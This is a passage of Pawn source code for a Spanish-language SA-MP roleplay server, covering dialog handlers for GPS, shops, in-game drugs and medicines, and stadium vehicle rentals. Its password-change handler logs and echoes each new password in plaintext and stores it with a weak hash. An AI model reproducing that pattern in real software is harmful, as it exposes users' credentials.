		            AddVehicleComponentEx(GetPlayerVehicleID(playerid),1155);
				}
				case 6: // Jester -
		        {
		            AddVehicleComponentEx(GetPlayerVehicleID(playerid),1159);
		            AddVehicleComponentEx(GetPlayerVehicleID(playerid),1160);
				}
				case 7: // Uranos -
		        {
		            AddVehicleComponentEx(GetPlayerVehicleID(playerid),1165);
		            AddVehicleComponentEx(GetPlayerVehicleID(playerid),1167);
				}
				case 8: // Browadway -
		        {
		            AddVehicleComponentEx(GetPlayerVehicleID(playerid),1174);
		            AddVehicleComponentEx(GetPlayerVehicleID(playerid),1175);
				}
				case 9: //Remington -
		        {
		            AddVehicleComponentEx(GetPlayerVehicleID(playerid),1179);
		            AddVehicleComponentEx(GetPlayerVehicleID(playerid),1180);
				}
				case 10: //Blade -
		        {
		            AddVehicleComponentEx(GetPlayerVehicleID(playerid),1182);
		            AddVehicleComponentEx(GetPlayerVehicleID(playerid),1183);
				}
				case 11: //Savanna
		        {
		            AddVehicleComponentEx(GetPlayerVehicleID(playerid),1187);
		            AddVehicleComponentEx(GetPlayerVehicleID(playerid),1189);
				}
			}
	        PlayerPlaySound(playerid, 1133, 0, 0, 0);
		}
		case dMMecanicos_3:
		{
		    if(!response) return 1;
		    new VehID = GetPlayerVehicleID(playerid);
		    switch(listitem)
		    {
		        case 0: SetVehicleHealth(VehID,1000);
		        case 1:
		        {
					new Float:Vida;
					GetVehicleHealth(VehID,Vida);
					RepairVehicle(VehID);
					SetVehicleHealth(VehID,Vida);
				}
				case 2: RepairVehicle(VehID);
			}
	        PlayerPlaySound(playerid, 1133, 0, 0, 0);
			return 1;
		}
		case dGPS_0:
		{
		    if(!response) return 1;
		    switch(listitem)
		    {
				case 0: Dialog(playerid,dGPS_Negocios,DIALOG_STYLE_LIST,""#CAZUL2"GPS - "#CVERDE"NEGOCIOS","> 24-7 (shops)\n> Ropa y accesorios\n> Bares y boliches\n> Comida y Restaurant's\n> Tienda de armas\n> HiperMercados\n> Casinos\n> Farmacias","Aceptar","Volver");
				case 1: Dialog(playerid,dGPS_Trabajos,DIALOG_STYLE_LIST,""#CAZUL2"GPS - "#CVERDE"TRABAJOS","> Camionero \n> Cosechador\n> Repartidor de diarios\n> Basurero\n> Repartidor de pizza","Aceptar","Volver");
				case 2: Dialog(playerid,dGPS_LPublicos,DIALOG_STYLE_LIST,""#CAZUL2"GPS - "#CVERDE"LUGARES PÚBLICOS","> Comisaria\n> Hospital\n> Centro de licencias\n> Televisión\n> Banco","Aceptar","Volver");
				case 3: Dialog(playerid,dGPS_Conce,DIALOG_STYLE_LIST,""#CAZUL2"GPS - "#CVERDE"CONCESIONARIOS","> Vehículos usados\n> Grotti\n> Beach motors","Aceptar","Volver");
/*				case 999:
				{
				    new Str[200];
				    Loop(i,sizeof(POS_ZRurales),0)
				    {
				        strcat(Str,POS_ZRurales[i][zonaNombre]);
					}
					Dialog(playerid,dGPS_ZRurales,DIALOG_STYLE_LIST,""#CAZUL2"GPS - "#CVERDE"ZONAS RURALES",Str,"Aceptar","Volver");
				}*/
				case 4: Dialog(playerid,dBuscadorVeh,DIALOG_STYLE_INPUT,"GPS - "#CVERDE"Buscar un vehículo",""#CBLANCO"Introduce la Pantente del vehículo que deseas buscar (FORMATO: "#CVERDE"LLL-NNN)","Buscar","Cancelar");
			}
		}
		case dGPS_Negocios:
		{
		    if(!response) return MostrarGPS(playerid);
			new Str[80],Str_[300],i_;
			SetPVarInt(playerid,"GPS_TipoNEG",listitem);
			new TIPO = GetPVarInt(playerid,"GPS_TipoNEG");
		    foreach(Negocios,i)
		    {
		        if(InfoNegocio[i][nTipo] == TIPO)
		        {
		            new Float:Distancia = GetPlayerDistanceFromPoint(playerid,InfoNegocio[i][nEntrada_x],InfoNegocio[i][nEntrada_y],InfoNegocio[i][nEntrada_z]);
					A_Format(Str,"> %s "#CVERDE"(Distancia: %0.2f M)\n",InfoNegocio[i][nNombre],Distancia);
					strcat(Str_,Str);
					A_Format(Str,"GPS_Neg_%d",i_);
					SetPVarInt(playerid,Str,i);
					i_++;
				}
			}
			Dialog(playerid,dGPS_Negocios_0,DIALOG_STYLE_LIST,""#CAZUL2"GPS",Str_,"Aceptar","Volver");
			return 1;
		}
		case dGPS_Negocios_0:
		{
		    if(!response) return MostrarGPS(playerid);
		    new ID = listitem,StrPVar[40];
		    A_Format(StrPVar,"GPS_Neg_%d",ID);
		    new i = GetPVarInt(playerid,StrPVar);
			CheckpointGPS(playerid,InfoNegocio[i][nEntrada_x],InfoNegocio[i][nEntrada_y],InfoNegocio[i][nEntrada_z],3);
   			return 1;
		}
		case dGPS_Trabajos:
		{
		    if(!response) return MostrarGPS(playerid);
		    switch(listitem)
		    {
		        case 0: CheckpointGPS(playerid,2430.00000000,-2115.69995117,13.80000019,5);//camionero
		        case 1: CheckpointGPS(playerid,-382.9777,-1426.2620,26.3193,5);//agricultor
		        case 2: CheckpointGPS(playerid,2028.3854,-1274.0673,20.9812,5);//repartidor de diarios
		        case 3: CheckpointGPS(playerid,1279.0297,-1248.3020,14.010,5);//basurero
		        case 4: CheckpointGPS(playerid,2104.5315,-1810.7769,13.5547,3);//repartidor (pizza)
			}
		}
		case dGPS_LPublicos:
		{
		    if(!response) return MostrarGPS(playerid);
		    switch(listitem)
		    {
		        case 0: CheckpointGPS(playerid,1536.8943,-1657.3226,13.5469,5);//Comisaria
		        case 1: CheckpointGPS(playerid,1205.7839,-1336.5894,13.019,5);//hospital
		        case 2: CheckpointGPS(playerid,1165.9354,-1741.1923,13.3984,5);//licencias
		        case 3: CheckpointGPS(playerid,640.2530,-1356.0043,13.3991,5);//television
		        case 4: CheckpointGPS(playerid,1481.3887,-1774.3002,15.3466,5);//banco
			}
		}
		case dGPS_Conce:
		{
		    if(!response) return MostrarGPS(playerid);
		    switch(listitem)
		    {
		        case 0: CheckpointGPS(playerid,1526.4135,-1024.5988,23.9359,5);//autos usados
		        case 1: CheckpointGPS(playerid,554.1650,-1249.0645,16.9042,5);//grotti
		        case 2: CheckpointGPS(playerid,478.8169,-1777.2671,5.4558,5);//wang playa
			}
		}
/*		case dGPS_ZRurales:
		{
		    if(!response) return MostrarGPS(playerid);
			CheckpointGPS(playerid,POS_ZRurales[listitem][zPosx],POS_ZRurales[listitem][zPosy],POS_ZRurales[listitem][zPosz],5);
			return 1;
		}
*/
		case dMercadoNegro:
		{
		    if(!response) return 1;
		    switch(listitem)
		    {
		        case 0:
		        {
		            if(GetPVarInt(playerid,"TIENE_VENDA")) return Error(playerid,"¡Ya tienes una venda!");
					if(GetPlayerMoney(playerid) < 20) return Error(playerid,"¡Dinero insuficiente!");
		            SetPVarInt(playerid,"TIENE_VENDA",1);
		            QuitarDinero(playerid,20);
		            Mensaje(playerid,-1,"Compraste una venda. Para vendar a alguien, usa "#CINFO"(/vendar)");
		            return 1;
				}
		        case 1:
		        {
		            if(GetPVarInt(playerid,"TIENE_SOGA")) return Error(playerid,"¡Ya tienes una soga!");
					if(GetPlayerMoney(playerid) < 30) return Error(playerid,"¡Dinero insuficiente!");
		            SetPVarInt(playerid,"TIENE_SOGA",1);
		            QuitarDinero(playerid,30);
		            Mensaje(playerid,-1,"Compraste una soga. Para atar a alguien, usa "#CINFO"(/atar)");
		            return 1;
				}
		        case 2:
		        {
					if(GetPlayerMoney(playerid) < 400) return Error(playerid,"¡Dinero insuficiente!");
					GivePlayerWeapon(playerid,22,80);
		            QuitarDinero(playerid,400);
		            Mensaje(playerid,-1,"Compraste una 9mm con 80 balas, por $400.");
		            return 1;
				}
				case 3:
				{
				    if(InfoJugador[playerid][jBomba]) return Error(playerid,"¡Solo puedes tener una bomba!");
				    if(GetPlayerMoney(playerid) < 35000) return Error(playerid,"¡Dinero insuficiente!");
				    InfoJugador[playerid][jBomba] = true;
				    QuitarDinero(playerid,35000);
				    Mensaje(playerid,-1,"Compraste una "#CROJO"BOMBA. "#CBLANCO"Para plantarla, utiliza "#CINFO"(/plantar bomba)");
				    return 1;
				}
				case 4:
				{
		            if(HaveObject(playerid, OBJ_MASCARA)) return Error(playerid,"¡Ya tienes una máscara!");
					if(GetPlayerMoney(playerid) < 30) return Error(playerid,"¡Dinero insuficiente!");
		            AddObjectInv(playerid)<OBJ_MASCARA>;
		            QuitarDinero(playerid,30);
		            Mensaje(playerid,-1,"Compraste una máscara. Para ponertela, o sacartela, usa "#CINFO"(/mascara)");
		            return 1;
				}
				case 5:
				{
				    if(GetPlayerMoney(playerid) < 180) return Error(playerid,"¡Dinero insuficiente!");
					QuitarDinero(playerid,180);
					GivePlayerWeapon(playerid,5,1);
					return 1;
				}
		        case 6:
		        {
					if(GetPlayerMoney(playerid) < 18000) return Error(playerid,"¡Dinero insuficiente!");
     				if(HaveObject(playerid, OBJ_DINAMITA)) return Error(playerid,"¡Ya tienes dinamita!");
		            if(!AddToInv(playerid, OBJ_DINAMITA)) return Error(playerid, "No tenes más espacio en el inventario");
		            QuitarDinero(playerid,18000);
		            Mensaje(playerid,-1,"Compraste una dinamita. Usa "#CINFO"(/dinamita) "#CBLANCO"para colocarla "#CVERDE"( explotará en 5 segundos )");
		            return 1;
				}
				case 7:
				{
					if(GetPlayerMoney(playerid) < 160) return Error(playerid,"¡Dinero insuficiente!");
					if( GetPVarInt(playerid,"TIENE_PINZA") ) return Error(playerid,"¡Ya tienes una pinza!");
					SetPVarInt(playerid,"TIENE_PINZA", 1);
		            QuitarDinero(playerid,160);
		            Mensaje(playerid,-1,"Compraste una pinza por "#CINFO"$160.");
					AutoRol(playerid,"compra una pinza");
		            return 1;
				}
			}
		}
		case dCTecnologia:
		{
		    if(!response) return 1;
		    switch(listitem)
		    {
		        case 0:
		        {
		            if(GetPlayerMoney(playerid) < PRECIO_CEL) return Error(playerid,"¡Dinero insuficiente!");
		            if(HaveObject(playerid, OBJ_CEL)) return Error(playerid,"¡Ya tienes un celular!");
		            if(!AddToInv(playerid, OBJ_CEL)) return Error(playerid, "No tenes más espacio en el inventario");
		            QuitarDinero(playerid,PRECIO_CEL);
		            new NumeroCel_;
					NumeroCel_ = Rand(10000,99999);
		            InfoJugador[playerid][jNumeroCel] = NumeroCel_;
					MensajeF(playerid,-1,"Compraste un celular, por $"#PRECIO_CEL""#CPOSITIVO" (Número: %d) "#CINFO"(/celular)",NumeroCel_);
					AutoRol(playerid,"compra un celular, por $"#PRECIO_CEL".");
					InfoNegocio[ID_Negocio(playerid)][nDinero] += PRECIO_CEL;
		    		Mensaje(playerid, C_ROJO, "NOTA: "#CBLANCO"Recuerde que el celular se guardó en su inventario, primero deberá sacarlo con la letra "#CVERDE"N");
					return 1;
				}
				case 1:
				{
		            if(GetPlayerMoney(playerid) < PRECIO_GPS) return Error(playerid,"¡Dinero insuficiente!");
		            if(HaveObject(playerid, OBJ_GPS)) return Error(playerid,"¡Ya tienes un GPS!");
		            if(!AddToInv(playerid, OBJ_GPS)) return Error(playerid, "No tenes más espacio en el inventario");
		            QuitarDinero(playerid,PRECIO_GPS);
		            Mensaje(playerid,-1,"Compraste un GPS, por "#PRECIO_GPS""#CPOSITIVO" "#CINFO"(/gps)");
					AutoRol(playerid,"compra un GPS, por $"#PRECIO_GPS"");
					InfoNegocio[ID_Negocio(playerid)][nDinero] += PRECIO_GPS;
					Mensaje(playerid, -1, "Recuerda que debes abrir el inventario "#CINFO"(Letra N)"#CBLANCO" para poder utilizarlo.");
					return 1;
				}



				case 2:
				{
    				Dialog(playerid,dComprarSaldo,DIALOG_STYLE_LIST,"COMPRAR SALDO - Elegir tarjeta","Tarjeta de 10$\nTarjeta de 30$\nTarjeta de 50$","Aceptar","Cancelar");
				}
				case 3:
				{
				    if(GetPlayerMoney(playerid) < 120) return Error(playerid,"¡Dinero insuficiente!");
				    GivePlayerWeapon(playerid,43,40);
				    QuitarDinero(playerid,120);
				    AutoRol(playerid,"compra una cámara, por $120");
				    return 1;
				}
				case 4:
				{
				    if(InfoJugador[playerid][jBuscadorVeh]) return Error(playerid,"¡Ya tienes un buscador!");
				    if(GetPlayerMoney(playerid) < PRECIO_BUSCADORVEH) return Error(playerid,"¡Dinero insuficiente!");
				    QuitarDinero(playerid,PRECIO_BUSCADORVEH);
				    AutoRol(playerid,"compra un buscador satelital de vehículos, por $"#PRECIO_BUSCADORVEH"");
				    InfoJugador[playerid][jBuscadorVeh] = true;
				    return 1;
				}
			}
		    return 1;
		}
		case dEditarFam:
		{
		    if(!response) return 0;
		    if(!listitem) return Dialog(playerid,dFamNombre,DIALOG_STYLE_INPUT,"Editar familia",""#CBLANCO"Escriba el nuevo nombre de la familia:","Aceptar","Cancelar");
			new i = GetPVarInt(playerid,"EDITAR_FAM");
			if(listitem == 1)
			{
			    GetPlayerPos(playerid,InfoFamilia[i][fPos_x],InfoFamilia[i][fPos_y],InfoFamilia[i][fPos_z]);
				Mensaje(playerid,-1,"Posición de familia, fue ajustada a la tuya");
				ActualizarFamilia(i);
			}
			else if(listitem == 2)
			{
			    new
					i_ = -1;

				while( famInfo:i_++ < famInfo )
				{
					InfoFamilia[i][famInfo:i_] = 0;
				}

				new Str[18];
				A_Format(Str,"Familias/%d.ini",i);
				fremove(Str);

			    Mensaje(playerid,-1,"> Familia borrada");

				return 1;
			}
		}
		case dFamNombre:
		{
		    if(!response || !strlen(inputtext)) return 0;
			new i = GetPVarInt(playerid,"EDITAR_FAM");
		    alm(InfoFamilia[i][fNombre],inputtext);
		    ActualizarFamilia(i);
			Mensaje(playerid,-1,"> Nombre ajustado correctamente");
			return 1;
		}
		case dCMedicamentos:
		{
		    if(!response) return 1;
		    if(listitem == 0)
		    {
				if(GetPlayerMoney(playerid) < 50) return Error(playerid,"¡Dinero insuficiente!");
				QuitarDinero(playerid,50);
				InfoJugador[playerid][jIbu400] += 5;
				AutoRol(playerid,"compra una tableta de 5 ibupirac x 400");
				InfoNegocio[ID_Negocio(playerid)][nDinero] += 50;
				return 1;
			}
			else if(listitem == 1)
			{
				if(GetPlayerMoney(playerid) < 100) return Error(playerid,"¡Dinero insuficiente!");
				QuitarDinero(playerid,100);
				InfoJugador[playerid][jIbu600] += 5;
				AutoRol(playerid,"compra una tableta de 5 ibupirac x 600");
				InfoNegocio[ID_Negocio(playerid)][nDinero] += 100;
				return 1;
			}
		}
		case dTomarMed:
		{
			if(!response) return 1;
			if(listitem == 0)
			{
			    if(!InfoJugador[playerid][jIbu400]) return Error(playerid,"¡No tienes Ibupirac x 400!");
				InfoJugador[playerid][jIbu400]--;
				if((GetTickCount() - GetPVarInt(playerid,"UltimaTomaI")) < 60000*1)
				{
				    if(IsPlayerInAnyVehicle(playerid)) RemovePlayerFromVehicle(playerid);
					cmd_vomitar(playerid,"");
					AutoRol(playerid,"toma su ibupirac, y vomita por una sobredosis de medicamentos");
					return 1;
				}

				AutoRol(playerid,"toma su ibupirac x 400");
				new Float:HP;
				GetPlayerHealth(playerid,HP);
				if(HP < 100) SetPlayerHealth(playerid,HP + 10);

				if(!IsPlayerInAnyVehicle(playerid))
				{
					ApplyAnimation(playerid, "FOOD", "EAT_Burger", 3.00, 0, 0, 0, 0, 0);
				}

				SetPVarInt(playerid,"UltimaTomaI",GetTickCount());
				SetPVarInt(playerid, "Efecto_ibupirac", (60 * 10) / 8);
				SetPlayerDrunkLevel(playerid,0);
				return 1;
			}
			else if(listitem == 1)
			{
			    if(!InfoJugador[playerid][jIbu600]) return Error(playerid,"¡No tienes Ibupirac x 600!");
				InfoJugador[playerid][jIbu600]--;
				if((GetTickCount() - GetPVarInt(playerid,"UltimaTomaI")) < 60000*3)
				{
					if(IsPlayerInAnyVehicle(playerid)) RemovePlayerFromVehicle(playerid);
					cmd_vomitar(playerid,"");
					AutoRol(playerid,"toma su ibupirac, y vomita por una sobredosis de medicamentos");
					return 1;
				}

				AutoRol(playerid,"toma su ibupirac x 600");
				new Float:HP;
				GetPlayerHealth(playerid,HP);
				if(HP < 100) SetPlayerHealth(playerid,HP + 22);
				if(!IsPlayerInAnyVehicle(playerid))
				{
					ApplyAnimation(playerid, "FOOD", "EAT_Burger", 3.00, 0, 0, 0, 0, 0);
				}
				SetPVarInt(playerid,"UltimaTomaI",GetTickCount());
				SetPVarInt(playerid, "Efecto_ibupirac", (60 * 20) / 8);
				SetPlayerDrunkLevel(playerid,0);
				return 1;
			}
		}
		case dDarMed:
		{
		    if(!response) return DeletePVar(playerid,"DAR_MED_ID");
		    new ID = GetPVarInt(playerid,"DAR_MED_ID");
		    if(listitem == 0)
		    {
			    if(!InfoJugador[playerid][jIbu400]) return Error(playerid,"¡No tienes Ibupirac x 400!");
				InfoJugador[playerid][jIbu400]--;
				InfoJugador[ID][jIbu400]++;
				new Str[60];
				A_Format(Str,"le da a %s una pastilla de Ibupirac x 400",NombreJugador(ID));

				if(!IsPlayerInAnyVehicle(playerid))
				{
					ApplyAnimation(playerid,"DEALER","shop_pay",3,0,0,1,0,3000,true);
				}

				if(!IsPlayerInAnyVehicle(ID))
				{
					ApplyAnimation(ID,"INT_SHOP","shop_shelf",3,0,0,1,0,3000,true);
				}

				AutoRol(playerid,Str);
			}
			else if(listitem == 1)
			{
			    if(!InfoJugador[playerid][jIbu600]) return Error(playerid,"¡No tienes Ibupirac x 600!");
				InfoJugador[playerid][jIbu600] --;
				InfoJugador[ID][jIbu600]++;
				new Str[60];
				A_Format(Str,"le da a %s una pastilla de Ibupirac x 600",NombreJugador(ID));

				if(!IsPlayerInAnyVehicle(playerid))
				{
					ApplyAnimation(playerid,"DEALER","shop_pay",3,0,0,1,0,3000,true);
				}

				if(!IsPlayerInAnyVehicle(ID))
				{
					ApplyAnimation(ID,"INT_SHOP","shop_shelf",3,0,0,1,0,3000,true);
				}

				AutoRol(playerid,Str);
			}
			DeletePVar(playerid,"DAR_MED_ID");
		}
		case dDarDroga:
		{
		    if(!response) return DeletePVar(playerid,"DAR_DROGA_ID");
		    new
				ID = GetPVarInt(playerid,"DAR_DROGA_ID");

		    if(!InfoJugador[playerid][jDroga][listitem]) return Error(playerid,"No tienes esa droga.");

			InfoJugador[playerid][jDroga][listitem] --;
			InfoJugador[ID][jDroga][listitem]++;
			new Str[60];

			switch(listitem)
			{
			    case DROGA_MARIHUANA: A_Format(Str,"le da a %s marihuana",NombreJugador(ID));
			    case DROGA_COCAINA: A_Format(Str,"le da a %s cocaina",NombreJugador(ID));
			    case DROGA_OPIO: A_Format(Str,"le da a %s opio",NombreJugador(ID));
			    case DROGA_CANNABIS: A_Format(Str,"le da a %s cannabis",NombreJugador(ID));
			}
			if(!IsPlayerInAnyVehicle(playerid))
			{
				ApplyAnimation(playerid,"DEALER","shop_pay",3,0,0,1,0,3000,true);
			}
			if(!IsPlayerInAnyVehicle(ID))
			{
				ApplyAnimation(ID,"INT_SHOP","shop_shelf",3,0,0,1,0,3000,true);
			}

			AutoRol(playerid,Str);
			DeletePVar(playerid,"DAR_MED_ID");
		}

		case dComprarSaldo:
		{
		    if(!response) return 1;
			if(listitem == 0)
			{
			    if(GetPlayerMoney(playerid) < 10) return Error(playerid,"¡Dinero insuficiente!");
			    QuitarDinero(playerid,10);
			    InfoJugador[playerid][jSaldo] += 10;
			    AutoRol(playerid,"compra una tarjeta de teléfono, de $10");
   				InfoNegocio[ID_Negocio(playerid)][nDinero] += 10;
			}
			else if(listitem == 1)
			{
			    if(GetPlayerMoney(playerid) < 30) return Error(playerid,"¡Dinero insuficiente!");
			    QuitarDinero(playerid,30);
			    InfoJugador[playerid][jSaldo] += 30;
			    AutoRol(playerid,"compra una tarjeta de teléfono, de $30");
   				InfoNegocio[ID_Negocio(playerid)][nDinero] += 30;
			}
			else if(listitem == 2)
			{
			    if(GetPlayerMoney(playerid) < 50) return Error(playerid,"¡Dinero insuficiente!");
			    QuitarDinero(playerid,50);
			    InfoJugador[playerid][jSaldo] += 50;
			    AutoRol(playerid,"compra una tarjeta de télefono, de $50");
   				InfoNegocio[ID_Negocio(playerid)][nDinero] += 50;
			}
		}
		case dCDroga:
		{
			if(!response) return 1;
			switch(listitem)
			{
			    case 0:
			    {
			        if(GetPlayerMoney(playerid) < 50) return Error(playerid,"¡Dinero insuficiente!");
			        InfoJugador[playerid][jDroga][DROGA_MARIHUANA] += 1;
			        QuitarDinero(playerid,50);
				}
			    case 1:
			    {
			        if(GetPlayerMoney(playerid) < 150) return Error(playerid,"¡Dinero insuficiente!");
			        InfoJugador[playerid][jDroga][DROGA_COCAINA] += 1;
			        QuitarDinero(playerid,150);
				}
			    case 2:
			    {
			        if(GetPlayerMoney(playerid) < 150) return Error(playerid,"¡Dinero insuficiente!");
			        InfoJugador[playerid][jDroga][DROGA_HEROINA] += 1;
			        QuitarDinero(playerid,150);
				}
			    case 3:
			    {
			        if(GetPlayerMoney(playerid) < 250) return Error(playerid,"¡Dinero insuficiente!");
			        InfoJugador[playerid][jDroga][DROGA_OPIO] += 1;
			        QuitarDinero(playerid,250);
				}
			    case 4:
			    {
			        if(GetPlayerMoney(playerid) < 300) return Error(playerid,"¡Dinero insuficiente!");
			        InfoJugador[playerid][jDroga][DROGA_CANNABIS] += 1;
			        QuitarDinero(playerid,300);
				}
			}
		}
		case dBuscadorVeh:
		{
		    if(!response) return 1;
		    if(strfind(inputtext,"-") == -1) return Error(playerid,"¡Formato inválido!");
		    foreach(VehVenta,i)
		    {
      			if(!strcmp(inputtext,InfoVeh[i][vPlaca],true))
         		{
					TextoJugador(playerid,_TD("~b~~h~BUSCANDO VEHÍCULO..."),4000,3);
					SetTimerEx("EncontrarVeh",5000,false,"ii",playerid,i);
					return 1;
				}
			}
			return Error(playerid,"¡No se encontro ningún vehículo con esa patente!");
		}
		case dCambiarPass:
		{
		    if(!response) return 1;
		    if(strlen(inputtext) < 1 || strlen(inputtext) > MAX_CARACTERES_CLAVE -1) return Error(playerid,"Debe tener de 1 a "#MAX_CARACTERES_CLAVES".");
			InfoJugador[playerid][jClave] = udb_hash(inputtext);
			new Str[60], INI:Arch = INI_Open(U_Usuario(playerid));
			INI_SetTag(Arch, "data");
			INI_WriteInt(Arch, "Contraseña", InfoJugador[playerid][jClave]);
			INI_Close(Arch);
			A_Format(Str,"%s cambió su contraseña a %s",NombreJugador_(playerid),inputtext);
			Log("LOG/Cambio_contraseñas.txt",Str);
			MensajeF(playerid,-1,"- Cambiaste tu contraseña a %s",inputtext);
			return 1;
		}
		case dCComida_pi:
		{
		    if(!response) return 1;
			switch(listitem)
			{
			    case 0:
			    {
  					if(GetPlayerMoney(playerid) < PRECIO_GASEOSA) return Error(playerid,"¡Dinero insufiente!");
					QuitarDinero(playerid,PRECIO_GASEOSA);
					SetPlayerSpecialAction(playerid,SPECIAL_ACTION_DRINK_SPRUNK);
					InfoNegocio[ID_Negocio(playerid)][nDinero] += PRECIO_GASEOSA;
					return AutoRol(playerid,"compra una lata de gaseosa");
				}
				case 1: Comer(playerid, 0, 25.0, 20,false);
				case 2: Comer(playerid, 0, 30.0, 22,false);
				case 3: Comer(playerid, 0, 40.0, 25,false);
			}
		}
		case dCComida_h:
		{
		    if(!response) return 1;
			switch(listitem)
			{
			    case 0:
			    {
  					if(GetPlayerMoney(playerid) < PRECIO_GASEOSA) return Error(playerid,"¡Dinero insufiente!");
					QuitarDinero(playerid,PRECIO_GASEOSA);
					SetPlayerSpecialAction(playerid,SPECIAL_ACTION_DRINK_SPRUNK);
					InfoNegocio[ID_Negocio(playerid)][nDinero] += PRECIO_GASEOSA;
					return AutoRol(playerid,"compra una lata de gaseosa");
				}
				case 1: Comer(playerid, 1, 25.0, 12,false);
				case 2: Comer(playerid, 1, 33.0, 20,false);
				case 3: Comer(playerid, 1, 40.0, 25,false);
			}
		}
		case dCComida_po:
		{
		    if(!response) return 1;
			switch(listitem)
			{
			    case 0:
			    {
  					if(GetPlayerMoney(playerid) < PRECIO_GASEOSA) return Error(playerid,"¡Dinero insufiente!");
					QuitarDinero(playerid,PRECIO_GASEOSA);
					SetPlayerSpecialAction(playerid,SPECIAL_ACTION_DRINK_SPRUNK);
					InfoNegocio[ID_Negocio(playerid)][nDinero] += PRECIO_GASEOSA;
					return AutoRol(playerid,"compra una lata de gaseosa");
				}
				case 1: Comer(playerid, -1, 20.0, 15,false);
				case 2: Comer(playerid, -1, 30.0, 20,false);
				case 3: Comer(playerid, -1, 40.0, 25,false);
			}
		}
/*		case dLPolicia:
		{
			new
				i = GetPVarInt(playerid, "PAG_LPOLICIA"),
				Butt_0[10] = "Anterior",
				Butt_1[10] = "Siguiente";

			if((!i && response) || ((i >= (sizeof LibroPolicia)-1) && !response)) return 1;
			else
			{
   			 if(!response) i++;
		    	else --i;
			}
			if(!i) Butt_0 = "Cerrar";
			if(i >= (sizeof LibroPolicia)-1) Butt_1 = "Cerrar";
			new Str[40];
			A_Format(Str,"Normas policiales "#CAZUL2"(Pag %d/%d)", i, (sizeof LibroPolicia)-1);
			ShowPlayerDialog(playerid, dLPolicia, DIALOG_STYLE_MSGBOX, Str, LibroPolicia[i], Butt_0, Butt_1);
			SetPVarInt(playerid, "PAG_LPOLICIA", i);
		}*/
		case dEstadio:
		{
			if(!response) return 1;
			switch(listitem)
			{
			    case 0:
			    {
			        PosEx(playerid,-1372.0627, 1649.1442, 1052.6855, 14);//MOTOCROSS
				}
			    case 1:
			    {
			        PosEx(playerid,-1424.4020, -664.6694, 1065.5156, 4);//RALLY
			        CongelarEx(playerid, 3);
				}
			    case 2:
			    {
			        PosEx(playerid,-1363.1294, 933.6328, 1036.4626, 15);//CRASHARENA
				}
				case 3:
				{
				    PosEx(playerid,-1404.4028, -256.3459, 1043.6334, 7);//TC-2000
				}
			}
			SetPVarInt(playerid,"EN_ESTADIO", 1);
			Mensaje(playerid, -1, "Para retirarte del estadio, utiliza "#CINFO"(/salir)");
		}
		case dCBoleto:
		{
		    if(!response) return 1;
		    if(IsPlayerInRangeOfPoint(playerid,50,-1372.0627, 1649.1442, 1052.6855))
	        {
				if(GetPlayerMoney(playerid) < 400) return Error(playerid,"¡Dinero insuficiente!");
				QuitarDinero(playerid, 400);
				new Sanchez, bool:FoundCar;
				if(random(2))
				{
			 		Sanchez = CreateVehicle(468, -1482.4185,1647.1914,1052.531, 0, random(120), random(120), 120);
				}
				else
				{
			 		Sanchez = CreateVehicle(468, -1485.6448,1648.6145,1052.531, 0, random(120), random(120), 120);
				}
				Loop(i, 20, 0)
				{
				    if(VehPrueba[i] == INVALID_VEHICLE_ID)
				    {
						VehPrueba[i] = Sanchez;
					 	FoundCar = true;
						break;
					}
				}
				if(!FoundCar)
				{
				    Error(playerid, "¡No quedan más vehículos de renta!");
					DestroyVehicle(Sanchez);
				}
				if(GetPVarInt(playerid, "ESTADIO_VEHID")) DestroyVehicle(GetPVarInt(playerid, "ESTADIO_VEHID"));
				LinkVehicleToInterior(Sanchez, 14);
				PutPlayerInVehicle(playerid, Sanchez, 0);
				Mensaje(playerid,-1,"Rentaste una Sanchez, en el estadio "#CVERDE"(MotoCross)");
				SetPVarInt(playerid,"ESTADIO_VEHID", GetPlayerVehicleID(playerid) );
			}
			else if(IsPlayerInRangeOfPoint(playerid,10,-1363.1294, 933.6328, 1036.4626))
	        {
				if(GetPlayerMoney(playerid) < 500) return Error(playerid,"¡Dinero insuficiente!");
				QuitarDinero(playerid, 500);
				new Monster, bool:FoundCar;
				if(random(2))
				{
			 		Monster = CreateVehicle(444, -1369.9388, 1015.5376, 1024.957, 0, random(120), random(120), 120);
				}
				else
				{
			 		Monster = CreateVehicle(444, -1439.6271, 969.2847, 1025.217, 0, random(120), random(120), 120);
				}
				Loop(i, 20, 0)
				{
				    if(VehPrueba[i] == INVALID_VEHICLE_ID)
				    {
						VehPrueba[i] = Monster;
					 	FoundCar = true;
						break;
					}
				}
				if(!FoundCar)
				{
				    Error(playerid, "¡No quedan más vehículos de renta!");
					DestroyVehicle(Monster);
				}
				if(GetPVarInt(playerid, "ESTADIO_VEHID")) DestroyVehicle(GetPVarInt(playerid, "ESTADIO_VEHID"));
				LinkVehicleToInterior(Monster, GetPlayerInterior(playerid));
				PutPlayerInVehicle(playerid, Monster, 0);
				Mensaje(playerid,-1,"> Rentaste una Monster, en el estadio "#CVERDE"(CrashArena)");
				SetPVarInt(playerid,"ESTADIO_VEHID", GetPlayerVehicleID(playerid) );
			}
			else if(IsPlayerInRangeOfPoint(playerid,10,-1424.4020, -664.6694, 1065.5156))
	        {
				if(GetPlayerMoney(playerid) < 500) return Error(playerid,"¡Dinero insuficiente!");
				QuitarDinero(playerid, 500);
				new VehID, VehModel, bool:FoundCar;
				VehModel = listitem+558;
				if(random(2))
				{
			 		VehID = CreateVehicle(VehModel, -1409.3821,-653.7744,1051.965, 0, random(120), random(120), 120);
				}
				else
				{
			 		VehID = CreateVehicle(VehModel, -1402.6816,-653.2593,1051.3114, 0, random(120), random(120), 120);
				}
				Loop(i, 20, 0)
				{
				    if(VehPrueba[i] == INVALID_VEHICLE_ID)
				    {
						VehPrueba[i] = VehID;
					 	FoundCar = true;
						break;
					}
				}
				if(!FoundCar)
				{
				    Error(playerid, "¡No quedan más vehículos de renta!");
					DestroyVehicle(VehID);
				}
				if(GetPVarInt(playerid, "ESTADIO_VEHID")) DestroyVehicle(GetPVarInt(playerid, "ESTADIO_VEHID"));
				LinkVehicleToInterior(VehID, 4);
				PutPlayerInVehicle(playerid, VehID, 0);
				Mensaje(playerid,-1,"> Rentaste un auto de rally, en el estadio "#CVERDE"(Rally)");
				SetPVarInt(playerid,"ESTADIO_VEHID", GetPlayerVehicleID(playerid) );
	        }
		    else if(IsPlayerInRangeOfPoint(playerid,20,-1404.4823, -256.3750, 1043.6334))
	        {
				if(GetPlayerMoney(playerid) < 600) return Error(playerid,"¡Dinero insuficiente!");
				QuitarDinero(playerid, 600);
				new Hotring, bool:FoundCar;
				if(random(2))
				{
